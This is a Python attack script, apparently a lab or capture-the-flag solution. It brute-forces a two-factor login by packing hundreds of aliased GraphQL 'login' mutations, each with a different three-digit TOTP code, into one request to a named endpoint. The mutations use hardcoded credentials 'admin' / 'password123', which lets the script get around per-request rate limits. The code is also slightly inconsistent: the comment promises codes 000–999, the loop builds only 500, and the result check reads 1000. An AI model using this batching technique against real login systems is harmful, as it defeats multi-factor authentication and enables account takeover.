import requests

# Define the GraphQL endpoint URL
graphql_url = "https://shark-app-mu3nz.ondigitalocean.app/graphql"

# Define your login credentials
username = "admin"
password = "password123"

# Build the GraphQL mutation query dynamically with aliases for all OTPs from 000 to 999
mutation_queries = []
for i in range(500):
    totp_code = f"{i:03}"
    # Each mutation gets an alias like `otp000`, `otp001`, etc.
    mutation_queries.append(f"""
    otp{i:03}: login(username: "{username}", password: "{password}", totpCode: "{totp_code}") {{
        message
        success
    }}
    """)

# Combine all mutation queries into a single GraphQL request
graphql_mutation = "mutation {" + "".join(mutation_queries) + "}"

# Prepare the payload
payload = {
    "query": graphql_mutation
}

# Send the POST request to the GraphQL server
response = requests.post(graphql_url, json=payload)

# Check if the response status is 200 (OK)
if response.status_code != 200:
    print(f"Request failed with status code {response.status_code}")
    print(f"Response content: {response.text}")
else:
    try:
        # Try to parse the JSON response
        data = response.json()

        # Iterate through all responses to check for success
        for i in range(1000):
            alias = f"otp{i:03}"
            success = data.get("data", {}).get(alias, {}).get("success", False)
            message = data.get("data", {}).get(alias, {}).get("message", "")

            # Print the result for each alias
            print(f"OTP {i:03}: {message}, Success: {success}")

            # If successful, break the loop
            if success:
                print(f"Login successful with OTP {i:03}!")
                break
    except requests.exceptions.JSONDecodeError:
        # Handle JSON decoding errors
        print("Failed to decode JSON response.")
        print(f"Response content: {response.text}")
